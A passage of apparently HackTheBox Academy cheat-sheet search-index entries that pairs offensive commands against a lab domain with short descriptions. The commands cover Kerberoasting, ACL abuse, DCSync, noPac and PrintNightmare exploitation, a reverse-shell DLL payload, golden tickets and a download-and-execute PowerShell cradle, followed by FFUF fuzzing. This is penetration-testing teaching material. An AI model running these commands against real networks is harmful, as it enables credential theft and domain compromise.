/home/administrator/Downloads/</code> Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#kerberoasting","title":"Kerberoasting","text":"Command Description <code>sudo python3 -m pip install .</code> Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. <code>GetUserSPNs.py -h</code> Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code> Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from  a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code> Impacket tool used to download/request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code> Impacket tool used to download/request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host. <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code> Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host. <code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code> Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host. <code>setspn.exe -Q */*</code> Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host. <code>Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"</code> PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. <code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \\| Select-String '^CN' -Context 0,1 \\| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code> Used to download/request all TGS tickets from a WIndows-based host. <code>mimikatz # base64 /out:true</code> <code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host. <code>kerberos::list /export</code> <code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host. <code>echo \"&lt;base64 blob&gt;\" \\|  tr -d \\\\n</code> Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host. <code>cat encoded_file \\| base64 -d &gt; sqldev.kirbi</code> Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host. <code>python2.7 kirbi2john.py sqldev.kirbi</code> Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host. <code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat</code> Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host. <code>cat sqldev_tgs_hashcat</code> Used to view the prepared hash from a Linux-based host. <code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code> Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host. <code>Import-Module .\\PowerView.ps1  Get-DomainUser * -spn \\| select samaccountname</code> Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host. <code>Get-DomainUser -Identity sqldev \\| Get-DomainSPNTicket -Format Hashcat</code> PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host. <code>Get-DomainUser * -SPN \\| Get-DomainSPNTicket -Format Hashcat \\| Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation</code> Exports all TGS tickets to a <code>.CSV</code> file (<code>ilfreight_tgs.csv</code>) from a Windows-based host. <code>cat .\\ilfreight_tgs.csv</code> Used to view the contents of the .csv file from a Windows-based host. <code>.\\Rubeus.exe</code> Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host. <code>.\\Rubeus.exe kerberoast /stats</code> Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host. <code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code> Used to request/download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host. <code>.\\Rubeus.exe kerberoast /user:testspn /nowrap</code> Used to request/download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host. <code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code> PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host. <code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code> Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host ."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#acl-enumeration-tactics","title":"ACL Enumeration &amp; Tactics","text":"Command Description <code>Find-InterestingDomainAcl</code> PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. <code>Import-Module .\\PowerView.ps1  $sid = Convert-NameToSid wley</code> Used to import PowerView and retrieve the <code>SID</code> of a specific user account (<code>wley</code>) from a Windows-based host. <code>Get-DomainObjectACL -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}</code> Used to find all Windows domain objects that the user has rights over by mapping the user's <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host. <code>$guid= \"00299570-246d-11d0-a768-00aa006e0529\"   Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \\| Select Name,DisplayName,DistinguishedName,rightsGuid \\| ?{$_.rightsGuid -eq $guid} \\| fl</code> Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host. <code>Get-DomainObjectACL -ResolveGUIDs -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}</code> Used to discover a domain object's ACL by performing a search based on GUID's (<code>-ResolveGUIDs</code>) from a Windows-based host. <code>Get-ADUser -Filter * \\| Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code> Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host. <code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" \\| Select-Object Path -ExpandProperty Access \\| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}</code> A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. <code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword)</code> Used to create a <code>PSCredential Object</code> from a Windows-based host. <code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code> Used to create a <code>SecureString Object</code> from a Windows-based host. <code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code> PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host. <code>Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * \\| Select -ExpandProperty Members</code> PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host. <code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code> PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host. <code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" \\| Select MemberName</code> PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host. <code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code> PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host. <code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code> PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host. <code>Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose</code> PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host. <code>ConvertFrom-SddlString</code> PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#dcsync","title":"DCSync","text":"Command Description <code>Get-DomainUser -Identity adunn  \\| select samaccountname,objectsid,memberof,useraccountcontrol \\|fl</code> PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host. <code>$sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\" Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs \\| ? { ($_.ObjectAceType -match 'Replication-Get')} \\| ?{$_.SecurityIdentifier -match $sid} \\| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \\| fl</code> Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user's replication rights. Performed from a Windows-based host. <code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code> Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>inlanefreight_hashes</code>). Performed from a Linux-based host. <code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator</code> Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#privileged-access","title":"Privileged Access","text":"Command Description <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"</code> PowerView based tool to used to enumerate the <code>Remote Desktop Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host. <code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"</code> PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host. <code>$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force</code> Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host. <code>$cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)</code> Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host. <code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code> Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>). <code>evil-winrm -i 10.129.201.234 -u forend</code> Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>. <code>Import-Module .\\PowerUpSQL.ps1</code> Used to import the <code>PowerUpSQL</code> tool. <code>Get-SQLInstanceDomain</code> PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. <code>Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'</code> PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query 'Select @@version'</code>) from a Windows-based host. <code>mssqlclient.py</code> Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host. <code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code> Impacket tool used to connect to a MSSQL server from a Linux-based host. <code>SQL&gt; help</code> Used to display mssqlclient.py options once connected to a MSSQL server. <code>SQL&gt; enable_xp_cmdshell</code> Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host. <code>xp_cmdshell whoami /priv</code> Used to enumerate rights on a system using <code>xp_cmdshell</code>."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#nopac","title":"NoPac","text":"Command Description <code>sudo git clone https://github.com/Ridter/noPac.git</code> Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host. <code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code> Runs <code>scanner.py</code> to check if a target system is vulnerable to <code>noPac</code>/<code>Sam_The_Admin</code> from a Linux-based host. <code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code> Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>  vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host. <code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code> Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>  vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#printnightmare","title":"PrintNightmare","text":"Command Description <code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code> Used to clone a PrintNightmare exploit  using git from a Linux-based host. <code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code> Used to ensure the exploit author's (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. <code>rpcdump.py @172.16.5.5 \\| egrep 'MS-RPRN\\|MS-PAR'</code> Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host. <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code> Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. <code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code> Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. <code>sudo python3 CVE-2021-1675.py inlanefreight.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 '\\\\10.129.202.111\\CompData\\backupscript.dll'</code> Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#petitpotam","title":"PetitPotam","text":"Command Description <code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code> Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host. <code>git clone https://github.com/topotam/PetitPotam.git</code> Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host. <code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code> Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host. <code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code> Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host. <code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code> Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host. <code>klist</code> <code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host. <code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code> Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host. <code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator \"ACADEMY-EA-DC01$\"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code> Impacket tool used to extract hashes from <code>NTDS.dit</code> using a <code>DCSync attack</code> and a captured hash (<code>-hashes</code>). Performed from a Linux-based host. <code>.\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code> Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host. <code>mimikatz # lsadump::dcsync /user:inlanefreight\\krbtgt</code> Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#miscellaneous-misconfigurations","title":"Miscellaneous Misconfigurations","text":"Command Description <code>Import-Module .\\SecurityAssessment.ps1</code> Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host. <code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code> SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host. <code>adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5</code> Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host. <code>adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r</code> Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host. <code>Get-DomainUser * \\| Select-Object samaccountname,description</code> PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host. <code>Get-DomainUser -UACFilter PASSWD_NOTREQD \\| Select-Object samaccountname,useraccountcontrol</code> PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host. <code>ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts</code> Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#group-policy-enumeration-attacks","title":"Group Policy Enumeration &amp; Attacks","text":"Command Description <code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code> Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host. <code>crackmapexec smb -L \\| grep gpp</code> Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host. <code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code> Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host. <code>Get-DomainGPO \\| select displayname</code> PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host. <code>Get-GPO -All \\| Select DisplayName</code> PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host. <code>$sid=Convert-NameToSid \"Domain Users\"</code> Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host. <code>Get-DomainGPO \\| Get-ObjectAcl \\| ?{$_.SecurityIdentifier -eq $sid</code> PowerView tool that is used to check if the <code>Domain Users</code>  (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host. <code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code> PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#asreproasting","title":"ASREPRoasting","text":"Command Description <code>Get-DomainUser -PreauthNotRequired \\| select samaccountname,userprincipalname,useraccountcontrol \\| fl</code> PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host. <code>.\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code> Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host. <code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt</code> Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host. <code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code> Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#trust-relationships-child-parent-trusts","title":"Trust Relationships - Child &gt; Parent Trusts","text":"Command Description <code>Import-Module activedirectory</code> Used to import the <code>Active Directory</code> module. Performed from a Windows-based host. <code>Get-ADTrust -Filter *</code> PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. <code>Get-DomainTrust</code> PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. <code>Get-DomainTrustMapping</code> PowerView tool used to perform a domain trust mapping from a Windows-based host. <code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \\| select SamAccountName</code> PowerView tools used to enumerate users in a target child domain from a Windows-based host. <code>mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt</code> Uses Mimikatz to obtain the <code>KRBTGT</code> account's <code>NT Hash</code> from a Windows-based host. <code>Get-DomainSID</code> PowerView tool used to get the SID for a target child domain from a Windows-based host. <code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" \\| select distinguishedname,objectsid</code> PowerView tool used to obtain the <code>Enterprise Admins</code> group's SID from a Windows-based host. <code>ls \\\\academy-ea-dc01.inlanefreight.local\\c$</code> Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host. <code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code> Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host . <code>.\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code> Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host. <code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm</code> Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host. <code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code> Impacket tool used to perform a DCSync attack from a Linux-based host. <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code> Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host. <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \\| grep \"Domain SID\"</code> Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \\| grep -B12 \"Enterprise Admins\"</code> Impacket tool used to retrieve the <code>SID</code> of a target Windows domain and attach it to the Enterprise Admin group's <code>RID</code> from a Linux-based host. <code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code> Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host. <code>export KRB5CCNAME=hacker.ccache</code> Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host. <code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code> Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. <code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code> Impacket tool that automatically performs an attack that escalates from child to parent domain."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#trust-relationships-cross-forest","title":"Trust Relationships - Cross-Forest","text":"Command Description <code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \\| select SamAccountName</code> PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host. <code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \\| select samaccountname,memberof</code> PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host. <code>.\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code> Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:FREIGHTLOGISTICS.local</code>) from a Windows-based host. <code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code> PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host. <code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator</code> PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host. <code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code> Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host. <code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code> Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host. <code>zip -r ilfreight_bh.zip *.json</code> Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI."},{"location":"HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/#harnessing-powershell","title":"Harnessing PowerShell","text":"Command Description <code>Get-Module</code> Lists available modules loaded for use. <code>Get-ExecutionPolicy -List</code> Will print the execution policy settings for each scope on a host. <code>Set-ExecutionPolicy Bypass -Scope Process</code> This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. <code>Get-Content C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt</code> With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. <code>powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"</code> This is a quick and easy way to download a file from the web using PowerShell and call it from memory. <code>Get-ChildItem Env: \\| ft Key,Value</code> Return environment values such as key paths, users, computer information, etc."},{"location":"HackTheBox%20Materials/Attacking%20Web%20Applications%20with%20FFUF/","title":"Attacking Web Applications with FFUF","text":"Command Description <code>ffuf -h</code> ffuf help <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code> Directory Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code> Extension Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code> Page Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code> Recursive Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code> Sub-domain Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx</code> VHost Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code> Parameter Fuzzing - GET <code>ffuf -w wordlist.txt:FUZZ -u 